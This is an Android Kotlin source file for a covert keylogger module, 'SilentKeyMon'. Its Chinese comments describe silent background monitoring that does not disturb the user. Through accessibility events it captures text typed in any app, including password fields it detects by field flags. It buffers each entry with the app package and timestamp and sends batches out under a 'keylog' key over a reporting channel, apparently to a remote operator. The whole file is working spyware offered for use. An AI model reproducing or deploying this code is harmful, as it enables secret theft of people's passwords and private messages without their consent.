package com.zaka.screenagent.keylog

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject

/**
 * 【被动模式】后台静默监控：不锁屏、不打扰，用户在任何 App 里输入密码/文本都记录下来，
 * 攒够/超时批量上报 `cacheData{k:'keylog'}`。
 *
 * 触发条件（比主动模式宽）：
 *   · 密码框（isPassword / inputType 含 PASSWORD）
 *   · 输入框并且内容变化（普通文本也记，面板「键盘」按钮能看到）
 */
object SilentKeyMon {

    private const val TAG = "SilentKeyMon"
    private const val FLUSH_MS = 5_000L
    private const val MAX_BUFFER = 300

    @Volatile var enabled: Boolean = true

    private val buffer = ArrayList<JSONObject>()
    private var lastFlush = 0L
    private var lastText = ""

    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
        if (!enabled) return
        runCatching {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> recordEvent(event)
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> flush(service, force = false)
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> flush(service, force = false)
            }
        }
    }

    private fun recordEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg == "com.lite.cloudfinder") return
        val node = event.source ?: return
        val cls = event.className?.toString() ?: ""
        val isPwd = node.isPassword || node.inputType and 0x80 != 0 || node.inputType and 0x10 != 0
        val text = event.text?.joinToString("") { it?.toString() ?: "" }.orEmpty()
        if (text.isEmpty() || text == lastText) return
        lastText = text
        val type = if (isPwd) "pwd" else "text"
        synchronized(buffer) {
            buffer.add(JSONObject().put("pkg", pkg).put("type", type).put("text", text)
                .put("cls", cls).put("ts", System.currentTimeMillis()))
            if (buffer.size > MAX_BUFFER) buffer.removeAt(0)
        }
        Log.d(TAG, "rec type=$type pkg=$pkg len=${text.length}")
    }

    fun flush(service: AccessibilityService, force: Boolean) {
        if (buffer.isEmpty()) return
        val now = System.currentTimeMillis()
        if (!force && now - lastFlush < FLUSH_MS) return
        lastFlush = now
        val arr = JSONArray()
        synchronized(buffer) {
            buffer.forEach { arr.put(it) }
            buffer.clear()
        }
        runCatching {
            com.zaka.screenagent.accessibility.BoundaryAccessibilityService.current()
                ?.moyingChannel()
                ?.send("cacheData", JSONObject().put("k", "keylog").put("cache", arr.toString()))
            Log.d(TAG, "flush ${arr.length()}")
        }
    }
}
